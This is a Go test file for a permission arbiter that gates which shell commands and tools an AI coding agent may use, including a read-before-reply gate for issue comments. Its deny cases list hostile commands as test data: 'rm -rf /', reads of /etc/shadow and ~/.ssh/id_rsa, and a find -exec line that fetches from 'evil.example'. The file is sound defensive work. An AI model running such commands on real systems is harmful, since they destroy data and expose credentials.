package opencode

import (
	"strings"
	"testing"

	"github.com/yusiwen/flowhub/internal/agent"
)

func bashRequest(command string, patterns ...string) PermissionRequest {
	if len(patterns) == 0 {
		patterns = []string{command}
	}
	return PermissionRequest{
		ID:         "per_1",
		SessionID:  "ses_1",
		Permission: "bash",
		Patterns:   patterns,
		Metadata:   PermissionMetadata{Command: command},
	}
}

func TestArbiterAllowsReadOnlyCommands(t *testing.T) {
	arbiter := DefaultArbiter()
	for _, command := range []string{
		"pwd",
		"ls -la",
		"cat README.md",
		"git status --short",
		"git log --oneline -5",
		"git diff HEAD",
		"go test ./...",
		"go vet ./...",
		"make test",
		"grep -rn foo internal/",
		"wc -l main.go",
		"find . -name '*.go'",
	} {
		decision := arbiter.Decide(bashRequest(command))
		if !decision.Allowed() {
			t.Errorf("Decide(%q) = %s (%s), want allowed", command, decision.Reply, decision.Reason)
		}
	}
}

// The live trial showed that opencode sends a compound shell line as ONE request:
// patterns=["pwd","ls -la"] with metadata.command="pwd && ls -la".
func TestArbiterAllowsCompoundReadOnlyCommands(t *testing.T) {
	arbiter := DefaultArbiter()
	decision := arbiter.Decide(bashRequest("pwd && ls -la", "pwd", "ls -la"))
	if !decision.Allowed() {
		t.Fatalf("compound read-only command rejected: %s", decision.Reason)
	}
	if decision.Reply != ReplyOnce {
		t.Fatalf("reply = %s, want once by default", decision.Reply)
	}
}

func TestArbiterRejectsDangerousAndWideningCommands(t *testing.T) {
	arbiter := DefaultArbiter()
	cases := map[string]string{
		"rm -rf /":                    "deny list",
		"sudo cat /etc/shadow":        "deny list",
		"curl https://example.com":    "curl may only reach",
		"git push origin master":      "deny list",
		"git commit -m x":             "deny list",
		"npm install left-pad":        "deny list",
		"sh -c 'rm -rf /'":            "deny list",
		"pwd && rm -rf /":             "deny list",
		"ls > /tmp/out":               "redirection",
		"ls >> /tmp/out":              "redirection",
		"cat /etc/passwd < /dev/null": "redirection",
		"echo `whoami`":               "backticks",
		"echo $(whoami)":              "command substitution",
		"sleep 5 &":                   "background",
		"python3 -c 'print(1)'":       "deny list",
		"cat ~/.ssh/id_rsa":           "outside the task worktree",
		"tail -f /var/log/system.log": "outside the task worktree",
		"cat /etc/passwd":             "outside the task worktree",
		"ls /Users/yusiwen/.config":   "outside the task worktree",
	}
	for command, wantReason := range cases {
		decision := arbiter.Decide(bashRequest(command))
		if decision.Allowed() {
			t.Errorf("Decide(%q) allowed, want rejected", command)
			continue
		}
		if decision.Reply != ReplyReject {
			t.Errorf("Decide(%q) = %s, want reject", command, decision.Reply)
		}
		if wantReason != "" && !contains(decision.Reason, wantReason) {
			t.Errorf("Decide(%q) reason = %q, want it to mention %q", command, decision.Reason, wantReason)
		}
	}
}

func TestArbiterRejectsWhenPatternsDisagreeWithTheCommand(t *testing.T) {
	arbiter := DefaultArbiter()
	// The command looks fine but one of the request's own patterns does not.
	decision := arbiter.Decide(bashRequest("ls -la", "ls -la", "rm -rf /"))
	if decision.Allowed() {
		t.Fatal("a pattern that is not allowlisted must block the request")
	}
}

func TestArbiterRejectsEmptyCommand(t *testing.T) {
	arbiter := DefaultArbiter()
	decision := arbiter.Decide(PermissionRequest{ID: "per_1", SessionID: "ses_1", Permission: "bash"})
	if decision.Allowed() {
		t.Fatal("an empty command must never be allowed")
	}
}

func TestArbiterHandlesNonBashPermissions(t *testing.T) {
	arbiter := DefaultArbiter()
	if decision := arbiter.Decide(PermissionRequest{Permission: "read"}); !decision.Allowed() {
		t.Fatalf("read rejected: %s", decision.Reason)
	}
	for _, kind := range []string{"edit", "external_directory", "webfetch", "websearch", "question"} {
		decision := arbiter.Decide(PermissionRequest{Permission: kind})
		if decision.Allowed() {
			t.Errorf("permission kind %q allowed, want rejected", kind)
		}
	}
}

func TestArbiterRemembersOnlyWhenAsked(t *testing.T) {
	remembering := DefaultArbiter()
	remembering.Remember = true
	if got := remembering.Decide(bashRequest("pwd")).Reply; got != ReplyAlways {
		t.Fatalf("reply = %s, want always when Remember is set", got)
	}

	var nilArbiter *Arbiter
	if decision := nilArbiter.Decide(bashRequest("pwd")); decision.Allowed() {
		t.Fatal("a nil arbiter must deny everything")
	}
}

func TestSplitSegments(t *testing.T) {
	got := splitSegments("pwd && ls -la || echo hi ; git status | wc -l")
	want := []string{"pwd", "ls -la", "echo hi", "git status", "wc -l"}
	if len(got) != len(want) {
		t.Fatalf("splitSegments = %v, want %v", got, want)
	}
	for index := range want {
		if got[index] != want[index] {
			t.Fatalf("splitSegments = %v, want %v", got, want)
		}
	}
}

func contains(haystack, needle string) bool {
	return len(needle) == 0 || (len(haystack) >= len(needle) && indexOf(haystack, needle) >= 0)
}

func indexOf(haystack, needle string) int {
	for i := 0; i+len(needle) <= len(haystack); i++ {
		if haystack[i:i+len(needle)] == needle {
			return i
		}
	}
	return -1
}

// TestTheNeutralRejectSpellingMatchesThisProduct pins the one value the dispatcher
// reads out of a permission decision: it tells "the agent was refused this command"
// from "the agent ran it" by `agent.DecisionReject`, and that set is what a human's
// permit authorises. A rename on either side would silently stop reporting refusals,
// so the two spellings are asserted to agree instead of assumed to.
func TestTheNeutralRejectSpellingMatchesThisProduct(t *testing.T) {
	if agent.DecisionReject != string(ReplyReject) {
		t.Fatalf("agent.DecisionReject = %q but this product rejects with %q",
			agent.DecisionReject, ReplyReject)
	}
}

// Maven is a Java repository's build/test entry point, the same way `go test` and
// `make test` are for the others. Both phases may build, and neither may publish.
func TestArbiterAllowsMavenBuilds(t *testing.T) {
	for name, arbiter := range map[string]*Arbiter{
		"analysis":  NewAnalysisArbiter(),
		"execution": NewExecutionArbiter(),
	} {
		for _, command := range []string{
			"mvn -v",
			"mvn -q -DskipTests package",
			"mvn verify",
			"./mvnw -q test",
			"mvnw -q clean install",
		} {
			if decision := arbiter.Decide(bashRequest(command)); !decision.Allowed() {
				t.Errorf("%s: Decide(%q) rejected: %s", name, command, decision.Reason)
			}
		}
	}
}

func TestArbiterRefusesMavenPublishing(t *testing.T) {
	for _, command := range []string{
		"mvn deploy",
		"mvn -q clean deploy",
		"./mvnw deploy",
		"mvn release:prepare",
		"mvn org.apache.maven.plugins:maven-deploy-plugin:3.1.1:deploy",
	} {
		decision := DefaultArbiter().Decide(bashRequest(command))
		if decision.Allowed() {
			t.Errorf("Decide(%q) allowed, want the publishing goal refused", command)
		}
	}
}

// A separator inside quotes is data: a grep alternation and a format string are
// single commands, and splitting them was refusing real analysis turns.
func TestArbiterAllowsQuotedSeparators(t *testing.T) {
	arbiter := NewAnalysisArbiter()
	for _, command := range []string{
		`grep -rn "supplementary\|补充附件\|Supplement" .`,
		`grep -rn 'a|b' .`,
		`grep -rn a\|b file.go`,
		`git log --pretty=format:"%h && %s"`,
		`echo "a; b"`,
	} {
		if decision := arbiter.Decide(bashRequest(command)); !decision.Allowed() {
			t.Errorf("Decide(%q) rejected: %s", command, decision.Reason)
		}
	}
}

func TestSplitSegmentsHonoursQuotes(t *testing.T) {
	cases := []struct {
		command string
		want    []string
	}{
		{`grep "a|b" . && pwd`, []string{`grep "a|b" .`, "pwd"}},
		{`echo 'a; b'`, []string{`echo 'a; b'`}},
		{`git log --pretty=format:"%h && %s"`, []string{`git log --pretty=format:"%h && %s"`}},
		{`grep a\|b .`, []string{`grep a\|b .`}},
		{`echo "a\"|b" && pwd`, []string{`echo "a\"|b"`, "pwd"}},
	}
	for _, tc := range cases {
		got := splitSegments(tc.command)
		if len(got) != len(tc.want) {
			t.Fatalf("splitSegments(%q) = %q, want %q", tc.command, got, tc.want)
		}
		for index := range tc.want {
			if got[index] != tc.want[index] {
				t.Fatalf("splitSegments(%q) = %q, want %q", tc.command, got, tc.want)
			}
		}
	}
}

func TestUnquotedSeparatorSurvivingSplittingIsRefused(t *testing.T) {
	// The safety net is exercised directly: the splitter is expected to consume
	// every unquoted separator, so a segment that still has one is a bug signal.
	for _, segment := range []string{"pwd ; ls", "pwd | ls", "pwd & ls"} {
		if !hasUnquotedSeparator(segment) {
			t.Errorf("hasUnquotedSeparator(%q) = false, want true", segment)
		}
	}
	for _, segment := range []string{`grep "a|b" .`, `grep a\|b .`, `echo 'a; b'`, `git log --pretty=format:"%h && %s"`} {
		if hasUnquotedSeparator(segment) {
			t.Errorf("hasUnquotedSeparator(%q) = true for quoted or escaped data", segment)
		}
	}
}

// `find -exec` runs a command the allowlist never saw. The usual `;` is caught by
// the separator check, but an escaped `\;` is data to the splitter and syntax to
// find, so the construct itself is refused.
func TestFindExecIsRefused(t *testing.T) {
	for _, command := range []string{
		`find . -exec curl -o x.png https://evil.example {} \;`,
		`find . -execdir rm -rf {} \;`,
	} {
		decision := DefaultArbiter().Decide(bashRequest(command))
		if decision.Allowed() {
			t.Errorf("Decide(%q) allowed, want find -exec refused", command)
		}
	}
}

// TestAPlanReplyNeedsTheDiscussionReadFirst is Phase 2 of the read-before-plan
// gate. The reply tool is gated by the session ruleset, so this arbiter is the
// place that can refuse it *before* a plan reaches the issue. A read that failed,
// or one from an earlier turn, does not count.
func TestAPlanReplyNeedsTheDiscussionReadFirst(t *testing.T) {
	arbiter := DefaultArbiter()
	arbiter.ReplyTools = normalizedToolSet([]string{"youtrack_add_issue_comment"})
	arbiter.RequireReadBeforeReply = []string{"youtrack_get_issue_comments"}

	reply := PermissionRequest{Permission: "youtrack.add_issue_comment"}
	if decision := arbiter.Decide(reply); decision.Allowed() {
		t.Fatal("a plan reply was allowed before reading the discussion")
	} else if !strings.Contains(decision.Reason, "youtrack_get_issue_comments") {
		t.Fatalf("the refusal does not name the read tool: %q", decision.Reason)
	}

	arbiter.ObserveTools([]ToolCall{{Name: "youtrack.get_issue_comments", Status: "error"}})
	if decision := arbiter.Decide(reply); decision.Allowed() {
		t.Fatal("a failed read was accepted as a read")
	}

	arbiter.ObserveTools([]ToolCall{{Name: "youtrack.get_issue_comments", Status: "completed"}})
	if decision := arbiter.Decide(reply); !decision.Allowed() {
		t.Fatalf("a completed read did not unlock the reply: %s", decision.Reason)
	}

	// A turn with no read requirement (analysis/execute) still allows its reply.
	plain := DefaultArbiter()
	plain.ReplyTools = normalizedToolSet([]string{"youtrack_add_issue_comment"})
	if decision := plain.Decide(reply); !decision.Allowed() {
		t.Fatalf("a reply without a read requirement was refused: %s", decision.Reason)
	}
}
